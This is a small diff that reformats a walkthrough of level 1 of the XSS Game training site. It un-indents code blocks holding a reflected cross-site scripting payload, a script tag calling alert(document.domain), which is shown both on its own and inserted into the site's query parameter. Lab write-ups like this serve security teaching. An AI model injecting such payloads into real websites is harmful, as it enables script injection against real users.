@@ -19,7 +19,7 @@ The first step is to analyze the application and observe how it works. This leve
 To pop an alert(), we can just inject a script tag with an alert code.
 
 ```javascript
-    <script>alert(document.domain)</script>
+<script>alert(document.domain)</script>
 ```
 
 OR
@@ -27,7 +27,7 @@ OR
 Set query parameter of url to the payload.
 
 ```bash
-    https://xss-game.appspot.com/level1/frame?query=<script>alert(document.domain)</script>
+https://xss-game.appspot.com/level1/frame?query=<script>alert(document.domain)</script>
 ```
 
 ![Xss Game Appspot Level 1 Solved](img/level-1-solved.png)
